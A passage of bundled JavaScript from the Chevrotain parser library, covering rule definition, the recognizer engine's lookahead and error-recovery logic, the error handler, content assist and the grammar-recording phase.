            ruleName: name
          };
          this.definitionErrors.push(error);
        }
        this.definedRulesNames.push(name);
        const ruleImplementation = this.defineRule(name, implementation, config);
        this[name] = ruleImplementation;
        return ruleImplementation;
      }
      OVERRIDE_RULE(name, impl, config = DEFAULT_RULE_CONFIG) {
        const ruleErrors = validateRuleIsOverridden(name, this.definedRulesNames, this.className);
        this.definitionErrors = this.definitionErrors.concat(ruleErrors);
        const ruleImplementation = this.defineRule(name, impl, config);
        this[name] = ruleImplementation;
        return ruleImplementation;
      }
      BACKTRACK(grammarRule, args2) {
        return function() {
          this.isBackTrackingStack.push(1);
          const orgState = this.saveRecogState();
          try {
            grammarRule.apply(this, args2);
            return true;
          } catch (e) {
            if (isRecognitionException(e)) {
              return false;
            } else {
              throw e;
            }
          } finally {
            this.reloadRecogState(orgState);
            this.isBackTrackingStack.pop();
          }
        };
      }
      // GAST export APIs
      getGAstProductions() {
        return this.gastProductionsCache;
      }
      getSerializedGastProductions() {
        return serializeGrammar(values_default(this.gastProductionsCache));
      }
    };
  }
});

// node_modules/chevrotain/lib/src/parse/parser/traits/recognizer_engine.js
var RecognizerEngine;
var init_recognizer_engine = __esm({
  "node_modules/chevrotain/lib/src/parse/parser/traits/recognizer_engine.js"() {
    init_lodash();
    init_keys2();
    init_exceptions_public();
    init_lookahead();
    init_interpreter();
    init_parser();
    init_recoverable();
    init_tokens_public();
    init_tokens();
    RecognizerEngine = class {
      initRecognizerEngine(tokenVocabulary, config) {
        this.className = this.constructor.name;
        this.shortRuleNameToFull = {};
        this.fullRuleNameToShort = {};
        this.ruleShortNameIdx = 256;
        this.tokenMatcher = tokenStructuredMatcherNoCategories;
        this.subruleIdx = 0;
        this.definedRulesNames = [];
        this.tokensMap = {};
        this.isBackTrackingStack = [];
        this.RULE_STACK = [];
        this.RULE_OCCURRENCE_STACK = [];
        this.gastProductionsCache = {};
        if (has_default(config, "serializedGrammar")) {
          throw Error("The Parser's configuration can no longer contain a <serializedGrammar> property.\n	See: https://chevrotain.io/docs/changes/BREAKING_CHANGES.html#_6-0-0\n	For Further details.");
        }
        if (isArray_default(tokenVocabulary)) {
          if (isEmpty_default(tokenVocabulary)) {
            throw Error("A Token Vocabulary cannot be empty.\n	Note that the first argument for the parser constructor\n	is no longer a Token vector (since v4.0).");
          }
          if (typeof tokenVocabulary[0].startOffset === "number") {
            throw Error("The Parser constructor no longer accepts a token vector as the first argument.\n	See: https://chevrotain.io/docs/changes/BREAKING_CHANGES.html#_4-0-0\n	For Further details.");
          }
        }
        if (isArray_default(tokenVocabulary)) {
          this.tokensMap = reduce_default(tokenVocabulary, (acc, tokType) => {
            acc[tokType.name] = tokType;
            return acc;
          }, {});
        } else if (has_default(tokenVocabulary, "modes") && every_default(flatten_default(values_default(tokenVocabulary.modes)), isTokenType)) {
          const allTokenTypes2 = flatten_default(values_default(tokenVocabulary.modes));
          const uniqueTokens = uniq_default(allTokenTypes2);
          this.tokensMap = reduce_default(uniqueTokens, (acc, tokType) => {
            acc[tokType.name] = tokType;
            return acc;
          }, {});
        } else if (isObject_default(tokenVocabulary)) {
          this.tokensMap = clone_default(tokenVocabulary);
        } else {
          throw new Error("<tokensDictionary> argument must be An Array of Token constructors, A dictionary of Token constructors or an IMultiModeLexerDefinition");
        }
        this.tokensMap["EOF"] = EOF;
        const allTokenTypes = has_default(tokenVocabulary, "modes") ? flatten_default(values_default(tokenVocabulary.modes)) : values_default(tokenVocabulary);
        const noTokenCategoriesUsed = every_default(allTokenTypes, (tokenConstructor) => isEmpty_default(tokenConstructor.categoryMatches));
        this.tokenMatcher = noTokenCategoriesUsed ? tokenStructuredMatcherNoCategories : tokenStructuredMatcher;
        augmentTokenTypes(values_default(this.tokensMap));
      }
      defineRule(ruleName, impl, config) {
        if (this.selfAnalysisDone) {
          throw Error(`Grammar rule <${ruleName}> may not be defined after the 'performSelfAnalysis' method has been called'
Make sure that all grammar rule definitions are done before 'performSelfAnalysis' is called.`);
        }
        const resyncEnabled = has_default(config, "resyncEnabled") ? config.resyncEnabled : DEFAULT_RULE_CONFIG.resyncEnabled;
        const recoveryValueFunc = has_default(config, "recoveryValueFunc") ? config.recoveryValueFunc : DEFAULT_RULE_CONFIG.recoveryValueFunc;
        const shortName = this.ruleShortNameIdx << BITS_FOR_METHOD_TYPE + BITS_FOR_OCCURRENCE_IDX;
        this.ruleShortNameIdx++;
        this.shortRuleNameToFull[shortName] = ruleName;
        this.fullRuleNameToShort[ruleName] = shortName;
        let invokeRuleWithTry;
        if (this.outputCst === true) {
          invokeRuleWithTry = function invokeRuleWithTry2(...args2) {
            try {
              this.ruleInvocationStateUpdate(shortName, ruleName, this.subruleIdx);
              impl.apply(this, args2);
              const cst = this.CST_STACK[this.CST_STACK.length - 1];
              this.cstPostRule(cst);
              return cst;
            } catch (e) {
              return this.invokeRuleCatch(e, resyncEnabled, recoveryValueFunc);
            } finally {
              this.ruleFinallyStateUpdate();
            }
          };
        } else {
          invokeRuleWithTry = function invokeRuleWithTryCst(...args2) {
            try {
              this.ruleInvocationStateUpdate(shortName, ruleName, this.subruleIdx);
              return impl.apply(this, args2);
            } catch (e) {
              return this.invokeRuleCatch(e, resyncEnabled, recoveryValueFunc);
            } finally {
              this.ruleFinallyStateUpdate();
            }
          };
        }
        const wrappedGrammarRule = Object.assign(invokeRuleWithTry, { ruleName, originalGrammarAction: impl });
        return wrappedGrammarRule;
      }
      invokeRuleCatch(e, resyncEnabledConfig, recoveryValueFunc) {
        const isFirstInvokedRule = this.RULE_STACK.length === 1;
        const reSyncEnabled = resyncEnabledConfig && !this.isBackTracking() && this.recoveryEnabled;
        if (isRecognitionException(e)) {
          const recogError = e;
          if (reSyncEnabled) {
            const reSyncTokType = this.findReSyncTokenType();
            if (this.isInCurrentRuleReSyncSet(reSyncTokType)) {
              recogError.resyncedTokens = this.reSyncTo(reSyncTokType);
              if (this.outputCst) {
                const partialCstResult = this.CST_STACK[this.CST_STACK.length - 1];
                partialCstResult.recoveredNode = true;
                return partialCstResult;
              } else {
                return recoveryValueFunc(e);
              }
            } else {
              if (this.outputCst) {
                const partialCstResult = this.CST_STACK[this.CST_STACK.length - 1];
                partialCstResult.recoveredNode = true;
                recogError.partialCstResult = partialCstResult;
              }
              throw recogError;
            }
          } else if (isFirstInvokedRule) {
            this.moveToTerminatedState();
            return recoveryValueFunc(e);
          } else {
            throw recogError;
          }
        } else {
          throw e;
        }
      }
      // Implementation of parsing DSL
      optionInternal(actionORMethodDef, occurrence) {
        const key = this.getKeyForAutomaticLookahead(OPTION_IDX, occurrence);
        return this.optionInternalLogic(actionORMethodDef, occurrence, key);
      }
      optionInternalLogic(actionORMethodDef, occurrence, key) {
        let lookAheadFunc = this.getLaFuncFromCache(key);
        let action;
        if (typeof actionORMethodDef !== "function") {
          action = actionORMethodDef.DEF;
          const predicate = actionORMethodDef.GATE;
          if (predicate !== void 0) {
            const orgLookaheadFunction = lookAheadFunc;
            lookAheadFunc = () => {
              return predicate.call(this) && orgLookaheadFunction.call(this);
            };
          }
        } else {
          action = actionORMethodDef;
        }
        if (lookAheadFunc.call(this) === true) {
          return action.call(this);
        }
        return void 0;
      }
      atLeastOneInternal(prodOccurrence, actionORMethodDef) {
        const laKey = this.getKeyForAutomaticLookahead(AT_LEAST_ONE_IDX, prodOccurrence);
        return this.atLeastOneInternalLogic(prodOccurrence, actionORMethodDef, laKey);
      }
      atLeastOneInternalLogic(prodOccurrence, actionORMethodDef, key) {
        let lookAheadFunc = this.getLaFuncFromCache(key);
        let action;
        if (typeof actionORMethodDef !== "function") {
          action = actionORMethodDef.DEF;
          const predicate = actionORMethodDef.GATE;
          if (predicate !== void 0) {
            const orgLookaheadFunction = lookAheadFunc;
            lookAheadFunc = () => {
              return predicate.call(this) && orgLookaheadFunction.call(this);
            };
          }
        } else {
          action = actionORMethodDef;
        }
        if (lookAheadFunc.call(this) === true) {
          let notStuck = this.doSingleRepetition(action);
          while (lookAheadFunc.call(this) === true && notStuck === true) {
            notStuck = this.doSingleRepetition(action);
          }
        } else {
          throw this.raiseEarlyExitException(prodOccurrence, PROD_TYPE.REPETITION_MANDATORY, actionORMethodDef.ERR_MSG);
        }
        this.attemptInRepetitionRecovery(this.atLeastOneInternal, [prodOccurrence, actionORMethodDef], lookAheadFunc, AT_LEAST_ONE_IDX, prodOccurrence, NextTerminalAfterAtLeastOneWalker);
      }
      atLeastOneSepFirstInternal(prodOccurrence, options) {
        const laKey = this.getKeyForAutomaticLookahead(AT_LEAST_ONE_SEP_IDX, prodOccurrence);
        this.atLeastOneSepFirstInternalLogic(prodOccurrence, options, laKey);
      }
      atLeastOneSepFirstInternalLogic(prodOccurrence, options, key) {
        const action = options.DEF;
        const separator = options.SEP;
        const firstIterationLookaheadFunc = this.getLaFuncFromCache(key);
        if (firstIterationLookaheadFunc.call(this) === true) {
          action.call(this);
          const separatorLookAheadFunc = () => {
            return this.tokenMatcher(this.LA(1), separator);
          };
          while (this.tokenMatcher(this.LA(1), separator) === true) {
            this.CONSUME(separator);
            action.call(this);
          }
          this.attemptInRepetitionRecovery(this.repetitionSepSecondInternal, [
            prodOccurrence,
            separator,
            separatorLookAheadFunc,
            action,
            NextTerminalAfterAtLeastOneSepWalker
          ], separatorLookAheadFunc, AT_LEAST_ONE_SEP_IDX, prodOccurrence, NextTerminalAfterAtLeastOneSepWalker);
        } else {
          throw this.raiseEarlyExitException(prodOccurrence, PROD_TYPE.REPETITION_MANDATORY_WITH_SEPARATOR, options.ERR_MSG);
        }
      }
      manyInternal(prodOccurrence, actionORMethodDef) {
        const laKey = this.getKeyForAutomaticLookahead(MANY_IDX, prodOccurrence);
        return this.manyInternalLogic(prodOccurrence, actionORMethodDef, laKey);
      }
      manyInternalLogic(prodOccurrence, actionORMethodDef, key) {
        let lookaheadFunction = this.getLaFuncFromCache(key);
        let action;
        if (typeof actionORMethodDef !== "function") {
          action = actionORMethodDef.DEF;
          const predicate = actionORMethodDef.GATE;
          if (predicate !== void 0) {
            const orgLookaheadFunction = lookaheadFunction;
            lookaheadFunction = () => {
              return predicate.call(this) && orgLookaheadFunction.call(this);
            };
          }
        } else {
          action = actionORMethodDef;
        }
        let notStuck = true;
        while (lookaheadFunction.call(this) === true && notStuck === true) {
          notStuck = this.doSingleRepetition(action);
        }
        this.attemptInRepetitionRecovery(
          this.manyInternal,
          [prodOccurrence, actionORMethodDef],
          lookaheadFunction,
          MANY_IDX,
          prodOccurrence,
          NextTerminalAfterManyWalker,
          // The notStuck parameter is only relevant when "attemptInRepetitionRecovery"
          // is invoked from manyInternal, in the MANY_SEP case and AT_LEAST_ONE[_SEP]
          // An infinite loop cannot occur as:
          // - Either the lookahead is guaranteed to consume something (Single Token Separator)
          // - AT_LEAST_ONE by definition is guaranteed to consume something (or error out).
          notStuck
        );
      }
      manySepFirstInternal(prodOccurrence, options) {
        const laKey = this.getKeyForAutomaticLookahead(MANY_SEP_IDX, prodOccurrence);
        this.manySepFirstInternalLogic(prodOccurrence, options, laKey);
      }
      manySepFirstInternalLogic(prodOccurrence, options, key) {
        const action = options.DEF;
        const separator = options.SEP;
        const firstIterationLaFunc = this.getLaFuncFromCache(key);
        if (firstIterationLaFunc.call(this) === true) {
          action.call(this);
          const separatorLookAheadFunc = () => {
            return this.tokenMatcher(this.LA(1), separator);
          };
          while (this.tokenMatcher(this.LA(1), separator) === true) {
            this.CONSUME(separator);
            action.call(this);
          }
          this.attemptInRepetitionRecovery(this.repetitionSepSecondInternal, [
            prodOccurrence,
            separator,
            separatorLookAheadFunc,
            action,
            NextTerminalAfterManySepWalker
          ], separatorLookAheadFunc, MANY_SEP_IDX, prodOccurrence, NextTerminalAfterManySepWalker);
        }
      }
      repetitionSepSecondInternal(prodOccurrence, separator, separatorLookAheadFunc, action, nextTerminalAfterWalker) {
        while (separatorLookAheadFunc()) {
          this.CONSUME(separator);
          action.call(this);
        }
        this.attemptInRepetitionRecovery(this.repetitionSepSecondInternal, [
          prodOccurrence,
          separator,
          separatorLookAheadFunc,
          action,
          nextTerminalAfterWalker
        ], separatorLookAheadFunc, AT_LEAST_ONE_SEP_IDX, prodOccurrence, nextTerminalAfterWalker);
      }
      doSingleRepetition(action) {
        const beforeIteration = this.getLexerPosition();
        action.call(this);
        const afterIteration = this.getLexerPosition();
        return afterIteration > beforeIteration;
      }
      orInternal(altsOrOpts, occurrence) {
        const laKey = this.getKeyForAutomaticLookahead(OR_IDX, occurrence);
        const alts = isArray_default(altsOrOpts) ? altsOrOpts : altsOrOpts.DEF;
        const laFunc = this.getLaFuncFromCache(laKey);
        const altIdxToTake = laFunc.call(this, alts);
        if (altIdxToTake !== void 0) {
          const chosenAlternative = alts[altIdxToTake];
          return chosenAlternative.ALT.call(this);
        }
        this.raiseNoAltException(occurrence, altsOrOpts.ERR_MSG);
      }
      ruleFinallyStateUpdate() {
        this.RULE_STACK.pop();
        this.RULE_OCCURRENCE_STACK.pop();
        this.cstFinallyStateUpdate();
        if (this.RULE_STACK.length === 0 && this.isAtEndOfInput() === false) {
          const firstRedundantTok = this.LA(1);
          const errMsg = this.errorMessageProvider.buildNotAllInputParsedMessage({
            firstRedundant: firstRedundantTok,
            ruleName: this.getCurrRuleFullName()
          });
          this.SAVE_ERROR(new NotAllInputParsedException(errMsg, firstRedundantTok));
        }
      }
      subruleInternal(ruleToCall, idx, options) {
        let ruleResult;
        try {
          const args2 = options !== void 0 ? options.ARGS : void 0;
          this.subruleIdx = idx;
          ruleResult = ruleToCall.apply(this, args2);
          this.cstPostNonTerminal(ruleResult, options !== void 0 && options.LABEL !== void 0 ? options.LABEL : ruleToCall.ruleName);
          return ruleResult;
        } catch (e) {
          throw this.subruleInternalError(e, options, ruleToCall.ruleName);
        }
      }
      subruleInternalError(e, options, ruleName) {
        if (isRecognitionException(e) && e.partialCstResult !== void 0) {
          this.cstPostNonTerminal(e.partialCstResult, options !== void 0 && options.LABEL !== void 0 ? options.LABEL : ruleName);
          delete e.partialCstResult;
        }
        throw e;
      }
      consumeInternal(tokType, idx, options) {
        let consumedToken;
        try {
          const nextToken = this.LA(1);
          if (this.tokenMatcher(nextToken, tokType) === true) {
            this.consumeToken();
            consumedToken = nextToken;
          } else {
            this.consumeInternalError(tokType, nextToken, options);
          }
        } catch (eFromConsumption) {
          consumedToken = this.consumeInternalRecovery(tokType, idx, eFromConsumption);
        }
        this.cstPostTerminal(options !== void 0 && options.LABEL !== void 0 ? options.LABEL : tokType.name, consumedToken);
        return consumedToken;
      }
      consumeInternalError(tokType, nextToken, options) {
        let msg;
        const previousToken = this.LA(0);
        if (options !== void 0 && options.ERR_MSG) {
          msg = options.ERR_MSG;
        } else {
          msg = this.errorMessageProvider.buildMismatchTokenMessage({
            expected: tokType,
            actual: nextToken,
            previous: previousToken,
            ruleName: this.getCurrRuleFullName()
          });
        }
        throw this.SAVE_ERROR(new MismatchedTokenException(msg, nextToken, previousToken));
      }
      consumeInternalRecovery(tokType, idx, eFromConsumption) {
        if (this.recoveryEnabled && // TODO: more robust checking of the exception type. Perhaps Typescript extending expressions?
        eFromConsumption.name === "MismatchedTokenException" && !this.isBackTracking()) {
          const follows = this.getFollowsForInRuleRecovery(tokType, idx);
          try {
            return this.tryInRuleRecovery(tokType, follows);
          } catch (eFromInRuleRecovery) {
            if (eFromInRuleRecovery.name === IN_RULE_RECOVERY_EXCEPTION) {
              throw eFromConsumption;
            } else {
              throw eFromInRuleRecovery;
            }
          }
        } else {
          throw eFromConsumption;
        }
      }
      saveRecogState() {
        const savedErrors = this.errors;
        const savedRuleStack = clone_default(this.RULE_STACK);
        return {
          errors: savedErrors,
          lexerState: this.exportLexerState(),
          RULE_STACK: savedRuleStack,
          CST_STACK: this.CST_STACK
        };
      }
      reloadRecogState(newState) {
        this.errors = newState.errors;
        this.importLexerState(newState.lexerState);
        this.RULE_STACK = newState.RULE_STACK;
      }
      ruleInvocationStateUpdate(shortName, fullName, idxInCallingRule) {
        this.RULE_OCCURRENCE_STACK.push(idxInCallingRule);
        this.RULE_STACK.push(shortName);
        this.cstInvocationStateUpdate(fullName);
      }
      isBackTracking() {
        return this.isBackTrackingStack.length !== 0;
      }
      getCurrRuleFullName() {
        const shortName = this.getLastExplicitRuleShortName();
        return this.shortRuleNameToFull[shortName];
      }
      shortRuleNameToFullName(shortName) {
        return this.shortRuleNameToFull[shortName];
      }
      isAtEndOfInput() {
        return this.tokenMatcher(this.LA(1), EOF);
      }
      reset() {
        this.resetLexerState();
        this.subruleIdx = 0;
        this.isBackTrackingStack = [];
        this.errors = [];
        this.RULE_STACK = [];
        this.CST_STACK = [];
        this.RULE_OCCURRENCE_STACK = [];
      }
    };
  }
});

// node_modules/chevrotain/lib/src/parse/parser/traits/error_handler.js
var ErrorHandler;
var init_error_handler = __esm({
  "node_modules/chevrotain/lib/src/parse/parser/traits/error_handler.js"() {
    init_exceptions_public();
    init_lodash();
    init_lookahead();
    init_parser();
    ErrorHandler = class {
      initErrorHandler(config) {
        this._errors = [];
        this.errorMessageProvider = has_default(config, "errorMessageProvider") ? config.errorMessageProvider : DEFAULT_PARSER_CONFIG.errorMessageProvider;
      }
      SAVE_ERROR(error) {
        if (isRecognitionException(error)) {
          error.context = {
            ruleStack: this.getHumanReadableRuleStack(),
            ruleOccurrenceStack: clone_default(this.RULE_OCCURRENCE_STACK)
          };
          this._errors.push(error);
          return error;
        } else {
          throw Error("Trying to save an Error which is not a RecognitionException");
        }
      }
      get errors() {
        return clone_default(this._errors);
      }
      set errors(newErrors) {
        this._errors = newErrors;
      }
      // TODO: consider caching the error message computed information
      raiseEarlyExitException(occurrence, prodType, userDefinedErrMsg) {
        const ruleName = this.getCurrRuleFullName();
        const ruleGrammar = this.getGAstProductions()[ruleName];
        const lookAheadPathsPerAlternative = getLookaheadPathsForOptionalProd(occurrence, ruleGrammar, prodType, this.maxLookahead);
        const insideProdPaths = lookAheadPathsPerAlternative[0];
        const actualTokens = [];
        for (let i = 1; i <= this.maxLookahead; i++) {
          actualTokens.push(this.LA(i));
        }
        const msg = this.errorMessageProvider.buildEarlyExitMessage({
          expectedIterationPaths: insideProdPaths,
          actual: actualTokens,
          previous: this.LA(0),
          customUserDescription: userDefinedErrMsg,
          ruleName
        });
        throw this.SAVE_ERROR(new EarlyExitException(msg, this.LA(1), this.LA(0)));
      }
      // TODO: consider caching the error message computed information
      raiseNoAltException(occurrence, errMsgTypes) {
        const ruleName = this.getCurrRuleFullName();
        const ruleGrammar = this.getGAstProductions()[ruleName];
        const lookAheadPathsPerAlternative = getLookaheadPathsForOr(occurrence, ruleGrammar, this.maxLookahead);
        const actualTokens = [];
        for (let i = 1; i <= this.maxLookahead; i++) {
          actualTokens.push(this.LA(i));
        }
        const previousToken = this.LA(0);
        const errMsg = this.errorMessageProvider.buildNoViableAltMessage({
          expectedPathsPerAlt: lookAheadPathsPerAlternative,
          actual: actualTokens,
          previous: previousToken,
          customUserDescription: errMsgTypes,
          ruleName: this.getCurrRuleFullName()
        });
        throw this.SAVE_ERROR(new NoViableAltException(errMsg, this.LA(1), previousToken));
      }
    };
  }
});

// node_modules/chevrotain/lib/src/parse/parser/traits/context_assist.js
var ContentAssist;
var init_context_assist = __esm({
  "node_modules/chevrotain/lib/src/parse/parser/traits/context_assist.js"() {
    init_interpreter();
    init_lodash();
    ContentAssist = class {
      initContentAssist() {
      }
      computeContentAssist(startRuleName, precedingInput) {
        const startRuleGast = this.gastProductionsCache[startRuleName];
        if (isUndefined_default(startRuleGast)) {
          throw Error(`Rule ->${startRuleName}<- does not exist in this grammar.`);
        }
        return nextPossibleTokensAfter([startRuleGast], precedingInput, this.tokenMatcher, this.maxLookahead);
      }
      // TODO: should this be a member method or a utility? it does not have any state or usage of 'this'...
      // TODO: should this be more explicitly part of the public API?
      getNextPossibleTokenTypes(grammarPath) {
        const topRuleName = head_default(grammarPath.ruleStack);
        const gastProductions = this.getGAstProductions();
        const topProduction = gastProductions[topRuleName];
        const nextPossibleTokenTypes = new NextAfterTokenWalker(topProduction, grammarPath).startWalking();
        return nextPossibleTokenTypes;
      }
    };
  }
});

// node_modules/chevrotain/lib/src/parse/parser/traits/gast_recorder.js
function recordProd(prodConstructor, mainProdArg, occurrence, handleSep = false) {
  assertMethodIdxIsValid(occurrence);
  const prevProd = last_default(this.recordingProdStack);
  const grammarAction = isFunction_default(mainProdArg) ? mainProdArg : mainProdArg.DEF;
  const newProd = new prodConstructor({ definition: [], idx: occurrence });
  if (handleSep) {
    newProd.separator = mainProdArg.SEP;
  }
  if (has_default(mainProdArg, "MAX_LOOKAHEAD")) {
    newProd.maxLookahead = mainProdArg.MAX_LOOKAHEAD;
  }
  this.recordingProdStack.push(newProd);
  grammarAction.call(this);
  prevProd.definition.push(newProd);
  this.recordingProdStack.pop();
  return RECORDING_NULL_OBJECT;
}
function recordOrProd(mainProdArg, occurrence) {
  assertMethodIdxIsValid(occurrence);
  const prevProd = last_default(this.recordingProdStack);
  const hasOptions = isArray_default(mainProdArg) === false;
  const alts = hasOptions === false ? mainProdArg : mainProdArg.DEF;
  const newOrProd = new Alternation({
    definition: [],
    idx: occurrence,
    ignoreAmbiguities: hasOptions && mainProdArg.IGNORE_AMBIGUITIES === true
  });
  if (has_default(mainProdArg, "MAX_LOOKAHEAD")) {
    newOrProd.maxLookahead = mainProdArg.MAX_LOOKAHEAD;
  }
  const hasPredicates = some_default(alts, (currAlt) => isFunction_default(currAlt.GATE));
  newOrProd.hasPredicates = hasPredicates;
  prevProd.definition.push(newOrProd);
  forEach_default(alts, (currAlt) => {
    const currAltFlat = new Alternative({ definition: [] });
    newOrProd.definition.push(currAltFlat);
    if (has_default(currAlt, "IGNORE_AMBIGUITIES")) {
      currAltFlat.ignoreAmbiguities = currAlt.IGNORE_AMBIGUITIES;
    } else if (has_default(currAlt, "GATE")) {
      currAltFlat.ignoreAmbiguities = true;
    }
    this.recordingProdStack.push(currAltFlat);
    currAlt.ALT.call(this);
    this.recordingProdStack.pop();
  });
  return RECORDING_NULL_OBJECT;
}
function getIdxSuffix(idx) {
  return idx === 0 ? "" : `${idx}`;
}
function assertMethodIdxIsValid(idx) {
  if (idx < 0 || idx > MAX_METHOD_IDX) {
    const error = new Error(
      // The stack trace will contain all the needed details
      `Invalid DSL Method idx value: <${idx}>
	Idx value must be a none negative value smaller than ${MAX_METHOD_IDX + 1}`
    );
    error.KNOWN_RECORDER_ERROR = true;
    throw error;
  }
}
var RECORDING_NULL_OBJECT, HANDLE_SEPARATOR, MAX_METHOD_IDX, RFT, RECORDING_PHASE_TOKEN, RECORDING_PHASE_CSTNODE, GastRecorder;
var init_gast_recorder = __esm({
  "node_modules/chevrotain/lib/src/parse/parser/traits/gast_recorder.js"() {
    init_lodash();
    init_api2();
    init_lexer_public();
    init_tokens();
    init_tokens_public();
    init_parser();
    init_keys2();
    RECORDING_NULL_OBJECT = {
      description: "This Object indicates the Parser is during Recording Phase"
    };
    Object.freeze(RECORDING_NULL_OBJECT);
    HANDLE_SEPARATOR = true;
    MAX_METHOD_IDX = Math.pow(2, BITS_FOR_OCCURRENCE_IDX) - 1;
    RFT = createToken2({ name: "RECORDING_PHASE_TOKEN", pattern: Lexer2.NA });
    augmentTokenTypes([RFT]);
    RECORDING_PHASE_TOKEN = createTokenInstance(
      RFT,
      "This IToken indicates the Parser is in Recording Phase\n	See: https://chevrotain.io/docs/guide/internals.html#grammar-recording for details",
      // Using "-1" instead of NaN (as in EOF) because an actual number is less likely to
      // cause errors if the output of LA or CONSUME would be (incorrectly) used during the recording phase.
      -1,
      -1,
      -1,
      -1,
      -1,
      -1
    );
    Object.freeze(RECORDING_PHASE_TOKEN);
    RECORDING_PHASE_CSTNODE = {
      name: "This CSTNode indicates the Parser is in Recording Phase\n	See: https://chevrotain.io/docs/guide/internals.html#grammar-recording for details",
      children: {}
    };
    GastRecorder = class {
      initGastRecorder(config) {
        this.recordingProdStack = [];
        this.RECORDING_PHASE = false;
      }
      enableRecording() {
        this.RECORDING_PHASE = true;
        this.TRACE_INIT("Enable Recording", () => {
          for (let i = 0; i < 10; i++) {
            const idx = i > 0 ? i : "";
            this[`CONSUME${idx}`] = function(arg1, arg2) {
              return this.consumeInternalRecord(arg1, i, arg2);
            };
            this[`SUBRULE${idx}`] = function(arg1, arg2) {
              return this.subruleInternalRecord(arg1, i, arg2);
            };
            this[`OPTION${idx}`] = function(arg1) {
              return this.optionInternalRecord(arg1, i);
            };
            this[`OR${idx}`] = function(arg1) {
              return this.orInternalRecord(arg1, i);
            };
            this[`MANY${idx}`] = function(arg1) {
              this.manyInternalRecord(i, arg1);
            };
            this[`MANY_SEP${idx}`] = function(arg1) {
              this.manySepFirstInternalRecord(i, arg1);
            };
            this[`AT_LEAST_ONE${idx}`] = function(arg1) {
              this.atLeastOneInternalRecord(i, arg1);
            };
            this[`AT_LEAST_ONE_SEP${idx}`] = function(arg1) {
              this.atLeastOneSepFirstInternalRecord(i, arg1);
            };
          }
          this[`consume`] = function(idx, arg1, arg2) {
            return this.consumeInternalRecord(arg1, idx, arg2);
          };
          this[`subrule`] = function(idx, arg1, arg2) {
            return this.subruleInternalRecord(arg1, idx, arg2);
          };
          this[`option`] = function(idx, arg1) {
            return this.optionInternalRecord(arg1, idx);
          };
          this[`or`] = function(idx, arg1) {
            return this.orInternalRecord(arg1, idx);
          };
          this[`many`] = function(idx, arg1) {
            this.manyInternalRecord(idx, arg1);
          };
          this[`atLeastOne`] = function(idx, arg1) {
            this.atLeastOneInternalRecord(idx, arg1);
          };
          this.ACTION = this.ACTION_RECORD;
          this.BACKTRACK = this.BACKTRACK_RECORD;
          this.LA = this.LA_RECORD;
        });
      }
      disableRecording() {
        this.RECORDING_PHASE = false;
        this.TRACE_INIT("Deleting Recording methods", () => {
          const that = this;
          for (let i = 0; i < 10; i++) {
            const idx = i > 0 ? i : "";
            delete that[`CONSUME${idx}`];
            delete that[`SUBRULE${idx}`];
            delete that[`OPTION${idx}`];
            delete that[`OR${idx}`];
            delete that[`MANY${idx}`];
            delete that[`MANY_SEP${idx}`];
            delete that[`AT_LEAST_ONE${idx}`];
            delete that[`AT_LEAST_ONE_SEP${idx}`];
          }
          delete that[`consume`];
          delete that[`subrule`];
          delete that[`option`];
          delete that[`or`];
          delete that[`many`];
          delete that[`atLeastOne`];
          delete that.ACTION;
          delete that.BACKTRACK;
          delete that.LA;
        });
      }
      //   Parser methods are called inside an ACTION?
      //   Maybe try/catch/finally on ACTIONS while disabling the recorders state changes?
      // @ts-expect-error -- noop place holder
      ACTION_RECORD(impl) {
      }
      // Executing backtracking logic will break our recording logic assumptions
      BACKTRACK_RECORD(grammarRule, args2) {
        return () => true;
      }
      // LA is part of the official API and may be used for custom lookahead logic
      // by end users who may forget to wrap it in ACTION or inside a GATE
      LA_RECORD(howMuch) {
        return END_OF_FILE;
      }
      topLevelRuleRecord(name, def) {
        try {
          const newTopLevelRule = new Rule({ definition: [], name });
          newTopLevelRule.name = name;
          this.recordingProdStack.push(newTopLevelRule);
          def.call(this);
          this.recordingProdStack.pop();
          return newTopLevelRule;
        } catch (originalError) {
          if (originalError.KNOWN_RECORDER_ERROR !== true) {
            try {
              originalError.message = originalError.message + '\n	 This error was thrown during the "grammar recording phase" For more info see:\n	https://chevrotain.io/docs/guide/internals.html#grammar-recording';
            } catch (mutabilityError) {
              throw originalError;
            }
          }
          throw originalError;
        }
      }
      // Implementation of parsing DSL
      optionInternalRecord(actionORMethodDef, occurrence) {
        return recordProd.call(this, Option, actionORMethodDef, occurrence);
      }
      atLeastOneInternalRecord(occurrence, actionORMethodDef) {
        recordProd.call(this, RepetitionMandatory, actionORMethodDef, occurrence);
      }
      atLeastOneSepFirstInternalRecord(occurrence, options) {
        recordProd.call(this, RepetitionMandatoryWithSeparator, options, occurrence, HANDLE_SEPARATOR);
      }
      manyInternalRecord(occurrence, actionORMethodDef) {
        recordProd.call(this, Repetition, actionORMethodDef, occurrence);
      }
      manySepFirstInternalRecord(occurrence, options) {
        recordProd.call(this, RepetitionWithSeparator, options, occurrence, HANDLE_SEPARATOR);
      }
      orInternalRecord(altsOrOpts, occurrence) {
        return recordOrProd.call(this, altsOrOpts, occurrence);
      }
      subruleInternalRecord(ruleToCall, occurrence, options) {
        assertMethodIdxIsValid(occurrence);
        if (!ruleToCall || has_default(ruleToCall, "ruleName") === false) {
          const error = new Error(`<SUBRULE${getIdxSuffix(occurrence)}> argument is invalid expecting a Parser method reference but got: <${JSON.stringify(ruleToCall)}>
 inside top level rule: <${this.recordingProdStack[0].name}>`);
          error.KNOWN_RECORDER_ERROR = true;
          throw error;
        }
        const prevProd = last_default(this.recordingProdStack);
        const ruleName = ruleToCall.ruleName;
        const newNoneTerminal = new NonTerminal({
          idx: occurrence,
          nonTerminalName: ruleName,
          label: options === null || options === void 0 ? void 0 : options.LABEL,
          // The resolving of the `referencedRule` property will be done once all the Rule's GASTs have been created
          referencedRule: void 0
        });
        prevProd.definition.push(newNoneTerminal);
        return this.outputCst ? RECORDING_PHASE_CSTNODE : RECORDING_NULL_OBJECT;
      }
      consumeInternalRecord(tokType, occurrence, options) {
        assertMethodIdxIsValid(occurrence);
        if (!hasShortKeyProperty(tokType)) {
          const error = new Error(`<CONSUME${getIdxSuffix(occurrence)}> argument is invalid expecting a TokenType reference but got: <${JSON.stringify(tokType)}>
 inside top level rule: <${this.recordingProdStack[0].name}>`);
          error.KNOWN_RECORDER_ERROR = true;
          throw error;
        }
        const prevProd = last_default(this.recordingProdStack);
        const newNoneTerminal = new Terminal({
          idx: occurrence,
          terminalType: tokType,
          label: options === null || options === void 0 ? void 0 : options.LABEL
        });
        prevProd.definition.push(newNoneTerminal);
        return RECORDING_PHASE_TOKEN;
      }
